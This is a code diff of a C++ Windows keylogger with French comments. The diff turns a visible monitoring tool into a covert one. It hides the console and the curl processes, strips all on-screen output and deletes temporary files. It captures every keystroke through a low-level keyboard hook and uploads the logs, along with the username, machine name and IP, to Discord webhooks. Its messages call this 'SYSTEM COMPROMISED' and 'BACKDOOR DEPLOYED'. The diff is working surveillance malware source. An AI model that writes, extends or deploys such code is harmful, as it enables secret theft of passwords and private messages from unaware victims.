@@ -19,7 +19,40 @@
 #include <versionhelpers.h>
 #include <shlobj.h>
 #include <objbase.h>
+#include <vector>
 
+void executeCurlHidden(const std::string& command) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;  // MASQUER COMPLÈTEMENT
+
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Créer le processus caché
+    if (CreateProcessA(
+        NULL,
+        const_cast<char*>(command.c_str()),
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,  // PAS DE FENÊTRE
+        NULL,
+        NULL,
+        &si,
+        &pi
+    )) {
+        // Attendre que curl termine
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "psapi.lib")
@@ -27,17 +60,17 @@
 #pragma comment(lib, "ole32.lib")
 
 // Définition des URLs des webhooks Discord
-#define WEBHOOK_INFO "<YOUR_WEBHOOK_URL_HERE>"
-#define WEBHOOK_CONNEXION "<YOUR_WEBHOOK_URL_HERE>"
-#define WEBHOOK_LOGS "<YOUR_WEBHOOK_URL_HERE>"
-#define WEBHOOK_DESACTIVATION "<YOUR_WEBHOOK_URL_HERE>"
+#define WEBHOOK_INFO "webhooks Discord"
+#define WEBHOOK_CONNEXION "webhooks Discord"
+#define WEBHOOK_LOGS "webhooks Discord"
+#define WEBHOOK_DESACTIVATION "webhooks Discord"
 
 // Définitions pour le comportement du programme
 #define visible
 #define bootwait
 #define FORMAT 0
 #define mouseignore
-#define SHOW_DEBUG_WINDOW
+#define SEND_INTERVAL_SECONDS 1800  // 30 minutes
 
 // Déclaration anticipée des fonctions
 int Save(int key_stroke);
@@ -47,6 +80,10 @@ void sendConnexionMessage();
 void sendLogMessage(const std::string& filepath);
 BOOL WINAPI consoleHandler(DWORD signal);
 std::string getUsername();
+void updateTimer();
+void saveAndSendLogs();
+void cleanupTempFiles();
+void registerTempFile(const std::string& filename);
 
 // Variables globales
 HHOOK _hook;
@@ -57,6 +94,8 @@ int cur_hour = -1;
 std::string messageBuffer;
 auto lastSendTime = std::chrono::steady_clock::now();
 std::string pcId;
+int timeRemaining = SEND_INTERVAL_SECONDS;
+std::vector<std::string> tempFiles;
 
 // Map pour les noms des touches
 #if FORMAT == 0
@@ -95,21 +134,27 @@ const std::map<int, std::string> keyname{
 
 // Codes couleur pour le terminal
 #define COLOR_BLACK 0
-#define COLOR_DARK_BLUE 1
-#define COLOR_DARK_GREEN 2
-#define COLOR_DARK_CYAN 3
 #define COLOR_DARK_RED 4
-#define COLOR_DARK_MAGENTA 5
-#define COLOR_DARK_YELLOW 6
-#define COLOR_GRAY 7
 #define COLOR_DARK_GRAY 8
-#define COLOR_BLUE 9
-#define COLOR_GREEN 10
-#define COLOR_CYAN 11
 #define COLOR_RED 12
-#define COLOR_MAGENTA 13
+#define COLOR_DARK_YELLOW 6
 #define COLOR_YELLOW 14
 #define COLOR_WHITE 15
+#define COLOR_CYAN 11
+#define COLOR_GREEN 10
+
+// Fonction pour enregistrer les fichiers temporaires
+void registerTempFile(const std::string& filename) {
+    tempFiles.push_back(filename);
+}
+
+// Fonction pour nettoyer tous les fichiers temporaires
+void cleanupTempFiles() {
+    for (const auto& file : tempFiles) {
+        DeleteFileA(file.c_str());
+    }
+    tempFiles.clear();
+}
 
 // Fonction pour définir la page de codes en UTF-8
 void setUTF8Console() {
@@ -123,38 +168,132 @@ void setColor(int color) {
     SetConsoleTextAttribute(hConsole, color);
 }
 
-// Fonction pour afficher un en-tête stylisé
+// Fonction pour afficher une ligne de séparation
+void printSeparator(char c = '─', int color = COLOR_DARK_GRAY) {
+    setColor(color);
+    std::cout << "  ";
+    for (int i = 0; i < 75; i++) {
+        std::cout << c;
+    }
+    std::cout << "\n";
+}
+
+// Fonction pour afficher le logo avec animation améliorée
+void printLogo() {
+    const char* logo[] = {
+        "  ███████╗██╗  ██╗████████╗██████╗  █████╗  ██████╗████████╗ ██████╗ ██████╗ ",
+        "  ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗",
+        "  █████╗   ╚███╔╝    ██║   ██████╔╝███████║██║        ██║   ██║   ██║██████╔╝",
+        "  ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══██║██║        ██║   ██║   ██║██╔══██╗",
+        "  ███████╗██╔╝ ██╗   ██║   ██║  ██║██║  ██║╚██████╗   ██║   ╚██████╔╝██║  ██║",
+        "  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"
+    };
+
+    int colors[] = { COLOR_DARK_RED, COLOR_DARK_RED, COLOR_RED, COLOR_RED, COLOR_DARK_YELLOW, COLOR_DARK_GRAY };
+
+    for (int i = 0; i < 6; i++) {
+        setColor(colors[i]);
+        std::cout << logo[i] << "\n";
+        Sleep(80);
+    }
+}
+
+// Fonction pour afficher un en-tête stylisé amélioré
 void printHeader() {
     system("cls");
-    setColor(COLOR_CYAN);
+    system("color 04");
+
     std::cout << "\n";
-    std::cout << "  ╔═══════════════════════════════════════════════════════════════╗\n";
-    std::cout << "  ║                                                               ║\n";
-    std::cout << "  ║           ";
+    printSeparator('═', COLOR_DARK_RED);
+    printLogo();
+    printSeparator('═', COLOR_DARK_RED);
+
+    setColor(COLOR_RED);
+    std::cout << "\n";
+    std::cout << "                      >>> INTRUSION PROTOCOL INITIATED <<<\n";
+    std::cout << "                         UNAUTHORIZED ACCESS DETECTED\n";
+
+    printSeparator('═', COLOR_DARK_RED);
     setColor(COLOR_WHITE);
-    std::cout << "🔐 KEYLOGGER MONITORING SYSTEM 🔐";
-    setColor(COLOR_CYAN);
-    std::cout << "              ║\n";
-    std::cout << "  ║                                                               ║\n";
-    std::cout << "  ╚═══════════════════════════════════════════════════════════════╝\n";
-    setColor(COLOR_GRAY);
     std::cout << "\n";
 }
 
-// Fonction pour afficher un message avec un préfixe stylisé
-void printMessage(const std::string& type, const std::string& message, int color) {
-    setColor(color);
-    std::cout << "  [" << type << "] ";
+// Fonction pour afficher une ligne de log formatée
+void printLogLine(const std::string& status, const std::string& message, int statusColor = COLOR_RED) {
+    setColor(COLOR_DARK_GRAY);
+    std::cout << "  [";
+    setColor(statusColor);
+    std::cout << status;
+    setColor(COLOR_DARK_GRAY);
+    std::cout << "] ";
     setColor(COLOR_WHITE);
     std::cout << message << "\n";
-    setColor(COLOR_GRAY);
 }
 
-// Fonction pour afficher une ligne de séparation
-void printSeparator() {
+// Fonction pour afficher le timer amélioré
+void printTimer() {
+    COORD coord;
+    coord.X = 0;
+    coord.Y = 12;
+    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);
+
+    int minutes = timeRemaining / 60;
+    int seconds = timeRemaining % 60;
+
+    std::cout << "\n";
+    printSeparator('─', COLOR_DARK_GRAY);
+
     setColor(COLOR_DARK_GRAY);
-    std::cout << "  ───────────────────────────────────────────────────────────────\n";
-    setColor(COLOR_GRAY);
+    std::cout << "  │ ";
+    setColor(COLOR_DARK_YELLOW);
+    std::cout << "DATA EXFILTRATION SCHEDULED IN: ";
+
+    if (timeRemaining <= 30) {
+        setColor(COLOR_RED);
+    }
+    else if (timeRemaining <= 120) {
+        setColor(COLOR_DARK_YELLOW);
+    }
+    else {
+        setColor(COLOR_WHITE);
+    }
+
+    std::cout << std::setfill('0') << std::setw(2) << minutes << ":"
+        << std::setw(2) << seconds;
+
+    setColor(COLOR_DARK_GRAY);
+    std::cout << "                         │\n";
+
+    printSeparator('─', COLOR_DARK_GRAY);
+
+    setColor(COLOR_DARK_GRAY);
+    std::cout << "  │ ";
+    setColor(COLOR_DARK_RED);
+    std::cout << "STATUS: ";
+    setColor(COLOR_RED);
+    std::cout << "ACTIVE MONITORING";
+
+    // Calculer les espaces nécessaires
+    int remaining = 54;
+    for (int i = 0; i < remaining; i++) std::cout << " ";
+
+    setColor(COLOR_DARK_GRAY);
+    std::cout << "│\n";
+
+    printSeparator('─', COLOR_DARK_GRAY);
+}
+
+// Fonction pour mettre à jour le timer
+void updateTimer() {
+    auto now = std::chrono::steady_clock::now();
+    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSendTime).count();
+    timeRemaining = SEND_INTERVAL_SECONDS - static_cast<int>(elapsed);
+
+    if (timeRemaining < 0) {
+        timeRemaining = 0;
+    }
+
+    printTimer();
 }
 
 // Fonction pour échapper les caractères spéciaux pour JSON
@@ -200,6 +339,17 @@ std::string getCurrentTime() {
     return ss.str();
 }
 
+// Fonction pour récupérer la date et l'heure au format ISO
+std::string getISOTimestamp() {
+    auto now = std::chrono::system_clock::now();
+    auto in_time_t = std::chrono::system_clock::to_time_t(now);
+    struct tm tm_info;
+    localtime_s(&tm_info, &in_time_t);
+    std::stringstream ss;
+    ss << std::put_time(&tm_info, "%Y-%m-%dT%H:%M:%S");
+    return ss.str();
+}
+
 // Fonction pour récupérer le nom d'utilisateur
 std::string getUsername() {
     char username[UNLEN + 1];
@@ -214,7 +364,7 @@ std::string getUsername() {
 std::string generatePCIdFromIP(const std::string& ipAddress) {
     std::string id = ipAddress;
     std::replace(id.begin(), id.end(), '.', '_');
-    return "PC_" + id;
+    return "TARGET_" + id;
 }
 
 // Fonction pour récupérer l'adresse IP locale
@@ -253,16 +403,16 @@ std::string getComputerName() {
 // Fonction pour récupérer la version de Windows
 std::string getWindowsVersion() {
     if (IsWindows10OrGreater()) {
-        return "Windows 10 ou superieur";
+        return "Windows 10+";
     }
     else if (IsWindows8OrGreater()) {
-        return "Windows 8 ou 8.1";
+        return "Windows 8/8.1";
     }
     else if (IsWindows7OrGreater()) {
         return "Windows 7";
     }
     else {
-        return "Version inconnue";
+        return "Unknown";
     }
 }
 
@@ -283,7 +433,7 @@ std::string getMemoryInfo() {
     double totalMem = static_cast<double>(memInfo.ullTotalPhys) / (1024 * 1024 * 1024);
     double freeMem = static_cast<double>(memInfo.ullAvailPhys) / (1024 * 1024 * 1024);
     std::ostringstream oss;
-    oss << std::fixed << std::setprecision(2) << totalMem << " Go (Disponible: " << freeMem << " Go)";
+    oss << std::fixed << std::setprecision(2) << totalMem << " GB (" << freeMem << " GB available)";
     return oss.str();
 }
 
@@ -294,10 +444,10 @@ std::string getDiskSpace() {
         double totalSpace = static_cast<double>(totalNumberOfBytes.QuadPart) / (1024 * 1024 * 1024);
         double freeSpace = static_cast<double>(freeBytesAvailable.QuadPart) / (1024 * 1024 * 1024);
         std::ostringstream oss;
-        oss << std::fixed << std::setprecision(2) << freeSpace << " Go / " << totalSpace << " Go";
+        oss << std::fixed << std::setprecision(2) << freeSpace << " GB / " << totalSpace << " GB";
         return oss.str();
     }
-    return "Inconnu";
+    return "Unknown";
 }
 
 // Fonction pour récupérer le nom du processeur
@@ -309,186 +459,164 @@ std::string getProcessorName() {
     case PROCESSOR_ARCHITECTURE_ARM: return "ARM";
     case PROCESSOR_ARCHITECTURE_IA64: return "IA64";
     case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
-    default: return "Inconnu";
+    default: return "Unknown";
     }
 }
 
-// Fonction pour envoyer un message avec toutes les informations du PC
-void sendInfoMessage() {
-    printMessage("INFO", "Preparation des informations systeme...", COLOR_CYAN);
+// Fonction pour envoyer un message avec embed Discord - Informations système
+// ================== FONCTIONS EMBEDS MISES À JOUR ==================
 
+void sendInfoMessage() {
     std::string username = getUsername();
     std::string ipAddress = getLocalIPAddress();
-    std::string currentTime = getCurrentTime();
+    std::string timestamp = getISOTimestamp();
     std::string computerName = getComputerName();
     std::string windowsVersion = getWindowsVersion();
     std::string architecture = getSystemArchitecture();
     std::string processor = getProcessorName();
     std::string memory = getMemoryInfo();
     std::string diskSpace = getDiskSpace();
-
     pcId = generatePCIdFromIP(ipAddress);
 
     std::ostringstream jsonPayload;
     jsonPayload << "{"
-        << "\"embeds\":[{"
-        << "\"title\":\"🖥️ Nouvelle Session Demarree\","
-        << "\"color\":3066993,"
-        << "\"fields\":["
-        << "{\"name\":\"🔑 ID du PC\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
-        << "{\"name\":\"💻 Nom de l'ordinateur\",\"value\":\"" << escapeJson(computerName) << "\",\"inline\":true},"
-        << "{\"name\":\"👤 Utilisateur\",\"value\":\"" << escapeJson(username) << "\",\"inline\":true},"
-        << "{\"name\":\"🌐 Adresse IP\",\"value\":\"" << escapeJson(ipAddress) << "\",\"inline\":true},"
-        << "{\"name\":\"🪟 Version Windows\",\"value\":\"" << escapeJson(windowsVersion) << "\",\"inline\":true},"
-        << "{\"name\":\"⚙️ Architecture\",\"value\":\"" << escapeJson(architecture) << "\",\"inline\":true},"
-        << "{\"name\":\"🔧 Processeur\",\"value\":\"" << escapeJson(processor) << "\",\"inline\":true},"
-        << "{\"name\":\"💾 Memoire\",\"value\":\"" << escapeJson(memory) << "\",\"inline\":true},"
-        << "{\"name\":\"📁 Espace disque (C:)\",\"value\":\"" << escapeJson(diskSpace) << "\",\"inline\":true},"
-        << "{\"name\":\"🕐 Heure de connexion\",\"value\":\"" << escapeJson(currentTime) << "\",\"inline\":false}"
+        << "\"username\": \"KeyLog\","
+        << "\"avatar_url\": \"https://i.pinimg.com/1200x/8d/54/7e/8d547eeed99e12413c4d58780b33c9cd.jpg\","
+        << "\"embeds\": [{"
+        << "\"title\": \"SYSTEM COMPROMISED\","
+        << "\"description\": \"Root access obtained - Full system penetration successful\","
+        << "\"color\": 16777215,"
+        << "\"image\": {\"url\": \"https://i.pinimg.com/1200x/34/8e/2c/348e2c524ecaafa6f235e7256bc80a3e.jpg\"},"
+        << "\"fields\": ["
+        << "{\"name\": \"TARGET ID\", \"value\": \"```target id```\", \"inline\": false},"
+        << "{\"name\": \"MACHINE\", \"value\": \"```machine name```\", \"inline\": true},"
+        << "{\"name\": \"USER\", \"value\": \"```username```\", \"inline\": true},"
+        << "{\"name\": \"IP ADDRESS\", \"value\": \"```ip address```\", \"inline\": true},"
+        << "{\"name\": \"SYSTEM\", \"value\": \"```Windows 10+ 64-bit```\", \"inline\": true},"
+        << "{\"name\": \"PROCESSOR\", \"value\": \"```processor```\", \"inline\": true},"
+        << "{\"name\": \"MEMORY\", \"value\": \"```memory```\", \"inline\": true},"
+        << "{\"name\": \"DISK SPACE\", \"value\": \"```disk space```\", \"inline\": false},"
+        << "{\"name\": \"STATUS\", \"value\": \"```ACTIVE - Data extraction in progress```\", \"inline\": false}"
         << "],"
-        << "\"footer\":{\"text\":\"Les logs seront envoyes toutes les 60 secondes\"}"
+        << "\"footer\": {\"text\": \"Extraction Protocol v2.0 • " << getCurrentTime() << "\"},"
+        << "\"timestamp\": \"" << timestamp << "\""
         << "}]"
         << "}";
 
-    std::ofstream jsonFile("temp_info.json");
+    std::string tempFile = "temp_info.json";
+    registerTempFile(tempFile);
+    std::ofstream jsonFile(tempFile);
     jsonFile << jsonPayload.str();
     jsonFile.close();
 
-    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @temp_info.json \"" + std::string(WEBHOOK_INFO) + "\" -k --silent";
-
-    printMessage("SEND", "Envoi des informations systeme a Discord...", COLOR_YELLOW);
-
-    int result = system(command.c_str());
-    if (result != 0) {
-        printMessage("ERROR", "Echec de l'envoi du message d'informations", COLOR_RED);
-    }
-    else {
-        printMessage("SUCCESS", "Message d'informations envoye avec succes!", COLOR_GREEN);
-    }
+    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_INFO) + "\" -k >nul 2>&1";
+    executeCurlHidden(command);
 }
 
-// Fonction pour envoyer un message de connexion
 void sendConnexionMessage() {
+    std::string timestamp = getISOTimestamp();
+
     std::ostringstream jsonPayload;
     jsonPayload << "{"
-        << "\"embeds\":[{"
-        << "\"title\":\"✅ Connexion Etablie\","
-        << "\"description\":\"Connexion etablie avec succes\","
-        << "\"color\":5763719,"
-        << "\"fields\":["
-        << "{\"name\":\"🖥️ PC ID\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
-        << "{\"name\":\"🕐 Heure\",\"value\":\"" << escapeJson(getCurrentTime()) << "\",\"inline\":true}"
+        << "\"username\": \"KeyLog\","
+        << "\"avatar_url\": \"https://i.pinimg.com/1200x/8d/54/7e/8d547eeed99e12413c4d58780b33c9cd.jpg\","
+        << "\"embeds\": [{"
+        << "\"title\": \"BACKDOOR DEPLOYED\","
+        << "\"description\": \"Keyboard hook installed - Real-time surveillance initialized\","
+        << "\"color\": 16777215,"
+        << "\"fields\": ["
+        << "{\"name\": \"TARGET\", \"value\": \"```target id```\", \"inline\": false},"
+        << "{\"name\": \"HOOK STATUS\", \"value\": \"```ACTIVE - All keystrokes monitored```\", \"inline\": true},"
+        << "{\"name\": \"CAPTURE MODE\", \"value\": \"```REAL-TIME```\", \"inline\": true},"
+        << "{\"name\": \"IP ADDRESS\", \"value\": \"```ip address```\", \"inline\": true}"
         << "],"
-        << "\"footer\":{\"text\":\"Keylogger actif\"}"
+        << "\"footer\": {\"text\": \"Surveillance Protocol Active • " << getCurrentTime() << "\"},"
+        << "\"timestamp\": \"" << timestamp << "\""
         << "}]"
         << "}";
 
-    std::ofstream jsonFile("temp_connexion.json");
+    std::string tempFile = "temp_connexion.json";
+    registerTempFile(tempFile);
+    std::ofstream jsonFile(tempFile);
     jsonFile << jsonPayload.str();
     jsonFile.close();
 
-    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @temp_connexion.json \"" + std::string(WEBHOOK_CONNEXION) + "\" -k --silent";
-
-    printMessage("SEND", "Envoi du message de connexion...", COLOR_YELLOW);
-
-    int result = system(command.c_str());
-    if (result != 0) {
-        printMessage("ERROR", "Echec de l'envoi du message de connexion", COLOR_RED);
-    }
-    else {
-        printMessage("SUCCESS", "Message de connexion envoye avec succes!", COLOR_GREEN);
-    }
+    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_CONNEXION) + "\" -k >nul 2>&1";
+    executeCurlHidden(command);
 }
 
-// Fonction pour envoyer un message de désactivation
-void sendExitMessage(const std::string& reason) {
-    std::ostringstream jsonPayload;
-    jsonPayload << "{"
-        << "\"embeds\":[{"
-        << "\"title\":\"⚠️ Keylogger Desactive\","
-        << "\"description\":\"" << escapeJson(reason) << "\","
-        << "\"color\":15158332,"
-        << "\"fields\":["
-        << "{\"name\":\"🖥️ PC ID\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
-        << "{\"name\":\"🕐 Heure\",\"value\":\"" << escapeJson(getCurrentTime()) << "\",\"inline\":true}"
-        << "],"
-        << "\"footer\":{\"text\":\"Session terminee\"}"
-        << "}]"
-        << "}";
-
-    std::ofstream jsonFile("temp_exit.json");
-    jsonFile << jsonPayload.str();
-    jsonFile.close();
-
-    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @temp_exit.json \"" + std::string(WEBHOOK_DESACTIVATION) + "\" -k --silent";
-
-    printMessage("EXIT", "Envoi du message de desactivation...", COLOR_YELLOW);
-    system(command.c_str());
-}
-
-// Fonction pour envoyer un fichier de log
 void sendLogMessage(const std::string& filepath) {
+    std::string timestamp = getISOTimestamp();
+
     std::ostringstream jsonPayload;
     jsonPayload << "{"
-        << "\"embeds\":[{"
-        << "\"title\":\"📝 Nouveaux Logs Disponibles\","
-        << "\"color\":3447003,"
-        << "\"fields\":["
-        << "{\"name\":\"🖥️ PC ID\",\"value\":\"" << escapeJson(pcId) << "\",\"inline\":true},"
-        << "{\"name\":\"🕐 Heure\",\"value\":\"" << escapeJson(getCurrentTime()) << "\",\"inline\":true},"
-        << "{\"name\":\"📄 Fichier\",\"value\":\"" << escapeJson(filepath) << "\",\"inline\":false}"
+        << "\"username\": \"KeyLog\","
+        << "\"avatar_url\": \"https://i.pinimg.com/1200x/8d/54/7e/8d547eeed99e12413c4d58780b33c9cd.jpg\","
+        << "\"embeds\": [{"
+        << "\"title\": \"DATA INTERCEPTED\","
+        << "\"description\": \"New keystroke data successfully captured\","
+        << "\"color\": 16777215,"
+        << "\"image\": {\"url\": \"https://i.pinimg.com/736x/de/b8/9f/deb89ffcee9a7a00f2b7289b88020d74.jpg\"},"
+        << "\"fields\": ["
+        << "{\"name\": \"TARGET\", \"value\": \"```target id```\", \"inline\": false},"
+        << "{\"name\": \"USER\", \"value\": \"```username```\", \"inline\": true},"
+        << "{\"name\": \"HOST\", \"value\": \"```machine name```\", \"inline\": true},"
+        << "{\"name\": \"IP\", \"value\": \"```ip address```\", \"inline\": true},"
+        << "{\"name\": \"FILE\", \"value\": \"```logs/log_target_xxxx.txt```\", \"inline\": false}"
         << "],"
-        << "\"footer\":{\"text\":\"Voir le fichier ci-joint\"}"
+        << "\"footer\": {\"text\": \"KeyLog • Data Exfiltration • " << getCurrentTime() << "\"},"
+        << "\"timestamp\": \"" << timestamp << "\""
         << "}]"
         << "}";
 
-    std::ofstream jsonFile("temp_log_embed.json");
+    std::string tempFile = "temp_log_embed.json";
+    registerTempFile(tempFile);
+    std::ofstream jsonFile(tempFile);
     jsonFile << jsonPayload.str();
     jsonFile.close();
 
-    std::string embedCommand = "curl -X POST -H \"Content-Type: application/json\" -d @temp_log_embed.json \"" + std::string(WEBHOOK_LOGS) + "\" -k --silent";
-    system(embedCommand.c_str());
+    std::string embedCommand = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_LOGS) + "\" -k >nul 2>&1";
+    executeCurlHidden(embedCommand);
 
-    std::string fileCommand = "curl -X POST -F \"file=@" + filepath + "\" \"" + std::string(WEBHOOK_LOGS) + "\" -k --silent";
+    Sleep(1000);
 
-    printMessage("SEND", "Envoi des logs pour " + pcId + "...", COLOR_YELLOW);
-
-    int result = system(fileCommand.c_str());
-    if (result != 0) {
-        printMessage("ERROR", "Echec de l'envoi du fichier de log", COLOR_RED);
-    }
-    else {
-        printMessage("SUCCESS", "Fichier de log envoye avec succes!", COLOR_GREEN);
-    }
+    std::string fileCommand = "curl -X POST -F \"file=@" + filepath + "\" \"" + std::string(WEBHOOK_LOGS) + "\" -k >nul 2>&1";
+    executeCurlHidden(fileCommand);
 }
 
 // Gestionnaire pour la fermeture forcée
 BOOL WINAPI consoleHandler(DWORD signal) {
     if (signal == CTRL_C_EVENT) {
-        sendExitMessage("ferme manuellement (Ctrl+C)");
+        sendExitMessage("FORCED INTERRUPTION - CTRL+C DETECTED");
     }
     else if (signal == CTRL_CLOSE_EVENT) {
-        sendExitMessage("ferme par la fenetre");
+        sendExitMessage("FORCED CLOSURE - WINDOW TERMINATED");
     }
     Sleep(2000);
     return TRUE;
 }
 
-// Fonction pour envoyer les logs si 60 secondes se sont écoulées
+// Fonction pour sauvegarder et envoyer les logs
+void saveAndSendLogs() {
+    if (!messageBuffer.empty()) {
+        std::string filename = "logs/log_" + pcId + "_" + std::to_string(time(NULL)) + ".txt";
+        std::ofstream logFile(filename);
+        logFile << messageBuffer;
+        logFile.close();
+        sendLogMessage(filename);
+        messageBuffer.clear();
+    }
+    lastSendTime = std::chrono::steady_clock::now();
+    timeRemaining = SEND_INTERVAL_SECONDS;
+}
+
+// Fonction pour envoyer les logs si l'intervalle est écoulé
 void sendBufferIfNeeded() {
     auto now = std::chrono::steady_clock::now();
     auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSendTime).count();
-    if (elapsed >= 60) {
-        if (!messageBuffer.empty()) {
-            printMessage("TIMER", "60 secondes ecoulees - Envoi des logs...", COLOR_MAGENTA);
-            std::string filename = "logs/log_" + pcId + "_" + std::to_string(time(NULL)) + ".txt";
-            std::ofstream logFile(filename);
-            logFile << messageBuffer;
-            logFile.close();
-            sendLogMessage(filename);
-            messageBuffer.clear();
-        }
-        lastSendTime = now;
+
+    if (elapsed >= SEND_INTERVAL_SECONDS) {
+        saveAndSendLogs();
     }
 }
 
@@ -506,18 +634,15 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 // Fonction pour installer le hook
 void SetHook() {
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
-        printMessage("ERROR", "Echec de l'installation du hook!", COLOR_RED);
-        MessageBox(NULL, L"Echec de l'installation du hook !", L"Erreur", MB_ICONERROR);
-    }
-    else {
-        printMessage("SUCCESS", "Hook installe avec succes", COLOR_GREEN);
+        setColor(COLOR_RED);
+        printLogLine("ERROR", "HOOK INSTALLATION FAILED", COLOR_RED);
+        MessageBox(NULL, L"Hook installation failed!", L"Error", MB_ICONERROR);
     }
 }
 
 // Fonction pour libérer le hook
 void ReleaseHook() {
     UnhookWindowsHookEx(_hook);
-    printMessage("INFO", "Hook libere", COLOR_CYAN);
 }
 
 // Fonction pour sauvegarder les logs
@@ -574,7 +699,6 @@ int Save(int key_stroke) {
         output_file.close();
         strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
         output_file.open(output_filename, std::ios_base::app);
-        printMessage("INFO", std::string("Journalisation dans ") + output_filename, COLOR_CYAN);
     }
     output_file << output.str();
     output_file.flush();
@@ -599,53 +723,102 @@ bool IsSystemBooting() {
     return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
 }
 
+// Fonction pour envoyer un message de désactivation avec embed
+void sendExitMessage(const std::string& reason) {
+    if (!messageBuffer.empty()) {
+        std::string filename = "logs/log_" + pcId + "_FINAL_" + std::to_string(time(NULL)) + ".txt";
+        std::ofstream logFile(filename);
+        logFile << messageBuffer;
+        logFile.close();
+        sendLogMessage(filename);
+        messageBuffer.clear();
+    }
+
+    cleanupTempFiles();
+
+    std::string timestamp = getISOTimestamp();
+
+    std::ostringstream jsonPayload;
+    jsonPayload << "{"
+        << "\"username\": \"KeyLog\","
+        << "\"embeds\": [{"
+        << "\"title\": \"CONNECTION TERMINATED\","
+        << "\"description\": \"" << escapeJson(reason) << "\","
+        << "\"color\": 3092790,"
+        << "\"fields\": ["
+        << "{\"name\": \"TARGET\", \"value\": \"```" << escapeJson(pcId) << "```\", \"inline\": false},"
+        << "{\"name\": \"BACKDOOR STATUS\", \"value\": \"```DEACTIVATED```\", \"inline\": true},"
+        << "{\"name\": \"CLEANUP STATUS\", \"value\": \"```ALL TEMP FILES DELETED```\", \"inline\": true},"
+        << "{\"name\": \"TRACES\", \"value\": \"```SUCCESSFULLY REMOVED```\", \"inline\": false}"
+        << "],"
+        << "\"timestamp\": \"" << timestamp << "\","
+        << "\"footer\": {\"text\": \"Termination Protocol Complete\"}"
+        << "}]"
+        << "}";
+
+    std::string tempFile = "temp_exit.json";
+    std::ofstream jsonFile(tempFile);
+    jsonFile << jsonPayload.str();
+    jsonFile.close();
+
+    std::string command = "curl -X POST -H \"Content-Type: application/json\" -d @" + tempFile + " \"" + std::string(WEBHOOK_DESACTIVATION) + "\" -k >nul 2>&1";
+    executeCurlHidden(command);
+
+    Sleep(2000);
+    DeleteFileA(tempFile.c_str());
+}
+
 // Fonction principale
 int main() {
-    setUTF8Console();
-    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    // MASQUER IMMÉDIATEMENT
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+    FreeConsole();
 
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     SetConsoleCtrlHandler(consoleHandler, TRUE);
 
-    printHeader();
-    printMessage("INIT", "Demarrage du keylogger...", COLOR_CYAN);
-    printSeparator();
-
+    // PAS de printHeader() ni printLogLine()
     Stealth();
 
     if (CreateDirectory(L"logs", NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
-        printMessage("SUCCESS", "Dossier de logs pret", COLOR_GREEN);
-    }
-    else {
-        printMessage("ERROR", "Impossible de creer le dossier de logs", COLOR_RED);
+        // PAS de printLogLine()
     }
 
-    printSeparator();
+    Sleep(500);
     sendInfoMessage();
-    printSeparator();
-    sendConnexionMessage();
-    printSeparator();
+    // PAS de printLogLine()
+    Sleep(500);
 
-    std::atexit([]() { sendExitMessage("ferme normalement"); });
+    sendConnexionMessage();
+    // PAS de printLogLine()
+    Sleep(500);
+
+    std::atexit([]() {
+        sendExitMessage("DISCONNECTION - SESSION TERMINATED");
+        });
 
 #ifdef bootwait
     while (IsSystemBooting()) {
-        printMessage("WAIT", "Le systeme est toujours en demarrage. Attente de 10 secondes...", COLOR_YELLOW);
+        // PAS de printLogLine()
         Sleep(10000);
     }
 #endif
 
     SetHook();
-    printSeparator();
-    printMessage("ACTIVE", "Keylogger actif - En attente de frappes clavier...", COLOR_GREEN);
-    printSeparator();
+    // PAS de printLogLine()
+    // PAS de std::cout
+
+    Sleep(1000);
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         Sleep(1000);
         sendBufferIfNeeded();
+        // PAS de updateTimer()
     }
+
     ReleaseHook();
     CoUninitialize();
     return 0;
-
 }
